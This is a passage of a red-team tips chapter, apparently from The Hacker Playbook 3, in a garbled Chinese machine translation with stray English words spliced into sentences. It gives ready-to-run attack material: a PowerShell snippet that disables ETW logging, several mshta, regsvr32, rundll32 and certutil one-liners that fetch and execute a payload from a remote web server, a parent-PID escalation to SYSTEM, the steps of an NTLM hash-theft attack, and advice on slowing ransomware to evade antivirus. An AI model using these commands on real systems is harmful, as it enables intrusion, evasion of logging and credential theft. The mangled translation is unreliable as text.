  \ Lean, and Accurate: Modeling Password Guessability Using Neural Networks - `https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher\\\
  `\n\n## 创意活动\n\n在公司的内部红队工作提供了进行创意活动的机会。`One` 我最喜欢的活动是模拟勒索软件。`In` 过去，我们被允许在 WannaCry\
  \ 时代运行模拟勒索软件活动。随着加密恶意软件/勒索软件的流行度变得 `more and more`，我们需要能够测试我们的业务恢复/灾难恢复程序。`We` 都亲眼见证了现实生活中的\
  \ WannaCry，它通过 SMB 共享横向移动，利用像 `EternalBlue` 这样的漏洞，加密文件，甚至删除主机系统上的所有备份。作为 IT 组织，我们需要问自己的问题是，如果我们的用户点击了该恶意软件，影响会是什么？`Could`\
  \ 我们恢复用户文件、共享文件、数据库和 `more`？`The` 我们经常听到答案是，“`I think so…`”，但在没有红队提前验证流程的情况下，我们要等到房子被烧毁后才得知真实答案。\n\
  \n`This` 就是我为什么喜欢让组织拥有内部红队。`We` 真正可以证明和验证安全和 IT 是否有效，全部在受控环境中。为此 THP 本书，`I` 未包含我们勒索软件的任何示例，因为这样做风险很大。`I`\
  \ 将留给您使用批准的方法构建工具并测试您的客户。\n\n### 模拟勒索软件提示\n\n*   `Some` 组织实际上不允许您删除/加密文件。对于这些公司，您可以进行模拟勒索软件漏洞事件。`Once`\
  \ 恶意软件执行后，它所做的一切是扫描主机/网络以查找重要文件，将每个文件读取到内存中，对随机字节进行逐个字节交换，将这些字节发送到 C2 服务器，并包含元数据。这将会演示您能够接触多少文件，在他们检测到流量之前能够从他们的网络中提取多少数据，以及他们可以恢复哪些文件。\n\
  \n*   `Look` 其他勒索软件样本以查看它们正在加密哪些文件类型。这可以为活动增加更多现实感。例如，查看 WannaCry 的文件类型 (`https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168`)。\n\
  \n*   `If` 您要“加密”恶意软件，请做简单一点。它可以是带密钥的 `AES`、公开/私有 x509 证书或某种位移 `XOR`。您使其越复杂，无法恢复文件的可能性就越高。\n\
  \n*   `Test`, `test`, and `test`. `The` 最糟糕的事情是您发现公司无法恢复关键文件且您的解密过程不起作用。\n\n*  \
  \ `Many` 下一代 AVs 会自动阻止基于链中某些行为的勒索软件。例如，勒索软件可能会执行的普通检测是：扫描系统中的所有类型 `X` 的文件、加密一个文件、删除卷影副本并禁用备份。为了绕过检测流程，尝试减缓\
  \ `this` 活动速度或找到执行这些相同策略但通过不同进程的方式。\n\n## 禁用 PS 日志记录\n\n作为红队成员，`we` 总是在寻找独特的方法来尝试禁用任何类型的日志记录。`Although`\
  \ 有方法可以执行这些攻击，我们仍然不断搜索新的简单技术。\n\n这里是 `leechristensen` (`https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs`)\
  \ 的示例，可用于禁用 PowerShell 日志：\n\n*   `$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');`\n\
  \n*   `$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList\
  \ @([Guid]::NewGuid());`\n\n*   `$EtwProvider.SetValue($null, $EventProvider);`\n\
  \n## 从互联网下载文件的 Windows 命令行\n\n如果您通过应用程序漏洞获得命令执行或通过 Office 文件或 PDF 获得 Shell 访问权限，接下来的步骤可能是下载并执行您的二次恶意软件。对于这些情况，有\
  \ Windows“功能”我们可以滥用来完成工作。这些示例中的大多数来自 `arno0x0x` 和 `@subtee` (`https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/`)\
  \ 的出色研究：\n\n*   `mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\
  \")\"))`\n\n*   `mshta http://webserver/payload.hta`\n\n*   `rundll32.exe javascript:\"\
  \\\\..\\\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\"\
  );window.close();`\n\n*   `regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll`\n\
  \n*   `certutil -urlcache -split -f http://webserver/payload payload`\n\n*   `certutil\
  \ -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode\
  \ payload.b64 payload.dll & C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\
  \\InstallUtil /logfile= /LogToConsole=false /u payload.dll`\n\n*   `certutil -urlcache\
  \ -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64\
  \ payload.exe & payload.exe`\n\n`These` 只是 `a` 少数示例，但有很多其他方法可以通过命令行获得您的二次代码执行。`It`\
  \ 取决于您找到其他技术来隐藏于传统日志之外。\n\n## 从本地管理员获取系统权限\n\n从本地管理员账户到系统可以以多种方式完成。最常见的方式，当然，是使用\
  \ Metasploit 的 `getsystem`，但并不总是可用。`decoder-it` (`https://github.com/decoder-it/psgetsystem`)\
  \ 创建了一个超棒的 PowerShell 脚本来从本地管理员 PowerShell 提示切换到系统，方法是创建一个新进程，将该新进程的父 PID 设置为拥有系统权限。该\
  \ PowerShell 可以找到 `here`: `https://github.com/decoder-it/psgetsystem` 并使用以下命令执行：\n\
  \n*   `PS> . .\\\\psgetsys.ps1\\`\n\n*   `PS>[MyProcess]::CreateProcessFromParent(<process_run_by_system>,<command_to_execute>)`\n\
  \n*   ![](img/00194.jpeg)\n\n## 在不触碰 LSASS 的情况下检索 NTLM 哈希值\n\nElad Shamir 进行了广泛研究，并能够找出如何在从未触摸\
  \ LSASS 的情况下抓取 NTLM 哈希。在此攻击之前，通过 Mimikatz 获取哈希的 LSASS 接触方式受到 Windows 10 Enterprise\
  \ 和 Windows Server 2016 中凭据守护程序的限制。Elad 开发了一种名为“内部独白”的攻击，执行以下操作：\n\n*   `Disable`\
  \ NetNTLMv1 预防控制措施，通过更改 `LMCompatibilityLevel`, `NTLMMinClientSec` 和 `RestrictSendingNTLMTraffic`\
  \ 为适当值，如上所述。\n\n*   `Retrieve` 当前运行进程中的所有非网络登录令牌并冒充关联的用户。\n\n*   `For` 每个被冒充的用户，与\
  \ NTLM SSP 本地交互以在冒充用户的安全上下文中对选择的挑战发出 NetNTLMv1 响应。\n\n*   `Restore` 恢复 `LMCompatibilityLevel`,\
  \ `NTLMMinClientSec` 和 `RestrictSendingNTLMTraffic` 的原始值。\n\n*   `[https://github.com/eladshamir/Internal-Monologue]`\n\
  \n*   ![](img/00195.jpeg)\n\n## 使用防御工具构建培训和监控环境\n\n\n\n\n测试我们的恶意软件具有挑战性的一部分是，我们需要非常迅速地配置测试环境。克里斯·隆（Chris\
  \ Long）构建的一个非常棒的工具，称为 `Detection Lab` (https://github.com/clong/DetectionLab)，是一套\
  \ `Packer` 和 `Vagrant` 脚本，可以快速将 Windows 活动目录上线。该工具包含一整套端点安全工具和日志记录最佳实践。`Detection\
  \ Lab` 由总共四个主机组成 (https://medium.com/@clong/introducing-detection-lab-61db34bed6ae)：\n\
  \n*   `DC`：一台 Windows 2016 域控制器\n*   `WEF`：一台管理 Windows 事件收集的 Windows 2016 服务器\n\
  *   `Win10`：模拟非服务器端点的 Windows 10 主机\n*   `Logger`：一台运行 Splunk 和 Fleet 服务器的 Ubuntu\
  \ 16.04 主机\n\n## 结论\n\n对于 `Red Teams`（红队）来说，技巧和小窍门是我们的手艺的一部分。我们必须不断研究更好的攻击用户、系统和规避检测的方法。没有灵丹妙药。这需要数年时间的磨练、汗水和泪水。\n\
  \n"
